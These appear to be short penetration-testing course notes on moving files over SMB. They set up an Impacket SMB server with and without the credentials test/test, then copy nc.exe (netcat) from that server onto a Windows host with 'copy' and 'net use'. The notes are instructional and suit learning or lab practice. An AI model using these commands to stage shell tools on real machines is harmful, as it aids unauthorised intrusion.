
```shell
smbserver.py share -smb2support /tmp/smbshare
```

copy file from smb server.

```cmd
copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:


#### Create the SMB Server with a Username and Password

```shell-session
smbserver.py share -smb2support /tmp/smbshare -user test -password test
```


Mount SMB Server with username and password

```cmd

net use n: \\192.168.220.133\share /user:test test

```

copying files from mount

```cmd
copy n:\nc.exe
```

if it errors

```bash

copy filename \\IP\sharename

```

to delete the mount

```bash
net use * /delete /yes
```
